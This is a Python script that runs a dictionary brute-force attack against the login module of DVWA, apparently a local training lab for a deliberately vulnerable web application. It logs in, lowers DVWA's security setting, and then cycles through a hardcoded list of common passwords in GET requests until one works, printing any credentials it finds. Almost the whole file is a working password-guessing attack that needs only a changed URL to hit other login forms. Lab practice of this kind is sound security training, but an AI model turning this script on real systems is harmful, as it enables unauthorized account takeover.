#!/usr/bin/env python3
# brute_force_dvwa.py

import requests
import sys
import urllib.parse
import time

# configuration
TARGET_URL = "http://dvwa.local/vulnerabilities/brute/"
LOGIN_URL = "http://dvwa.local/login.php"
DVWA_USER = "admin"
DVWA_PASS = "password"

# slavar passwords
PASSWORDS = [
    'password', '123456', '12345678', 'qwerty', 'abc123',
    'monkey', 'letmein', 'dragon', '111111', 'baseball',
    'admin', 'password1', 'superman', '654321', 'ashley'
]

def setup_session():
    """create autification session"""
    session = requests.Session()
    
    # login DVWA
    login_data = {
        'username': DVWA_USER,
        'password': DVWA_PASS,
        'Login': 'Login'
    }
    
    print("[*] avtorizacia DVWA...")
    response = session.post(LOGIN_URL, data=login_data)
    
    if 'Login failed' in response.text:
        print("[!] error: false data DVWA")
        sys.exit(1)
    
    # "low" security level
    security_data = {'security': 'low', 'seclev_submit': 'Submit'}
    session.post('http://dvwa.local/security.php', data=security_data)
    
    print("[+] session complete")
    return session

def brute_force_attack(session, username):
    """brute-force attack"""
    print(f"\n[*] brute-force for user: {username}")
    print("[*] GET with username/password\n")
    
    success = False
    
    for i, password in enumerate(PASSWORDS, 1):
        # GET like in origin
        params = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        
        # cod parmets for URL
        query_string = urllib.parse.urlencode(params)
        attack_url = f"{TARGET_URL}?{query_string}"
        
        print(f"[{i}] try: {username}:{password}")
        
        try:
            response = session.get(attack_url)
            
            # check succsesful vxod
            if 'Welcome' in response.text or 'successfully' in response.text.lower():
                print(f"\n[+] succses!")
                print(f"[+] user: {username}")
                print(f"[+] passsword: {password}")
                success = True
                break
                
        except Exception as e:
            print(f"[!] error request: {e}")
        
        
        time.sleep(0.1)
    
    if not success:
        print("\n[-] password not found")
    
    return success

def main():
    print("=" * 60)
    print("BRUTE-FORCE АТАКА НА DVWA")
    print("=" * 60)
    
    
    target_user = input("enter the username for the attack [admin]: ").strip()
    if not target_user:
        target_user = "admin"
    
    
    session = setup_session()
    
    
    brute_force_attack(session, target_user)
    
    print("\n" + "=" * 60)
    print("zlodeystvo complete")
    print("=" * 60)

if __name__ == "__main__":
    main()
